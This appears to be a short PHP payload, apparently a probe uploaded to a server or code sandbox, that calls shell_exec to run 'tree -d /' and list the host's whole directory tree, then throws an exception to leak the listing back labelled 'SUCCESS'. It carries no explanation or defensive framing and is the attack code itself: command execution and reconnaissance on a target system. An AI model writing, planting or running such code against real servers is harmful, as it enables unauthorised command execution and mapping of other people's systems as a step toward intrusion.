<?php
$output ='';
$output =$output."\n HEIL TEH TREE ".shell_exec (' tree -d /| xargs');



throw new Exception("\n SUCCESS  ". $output."\n");
?>
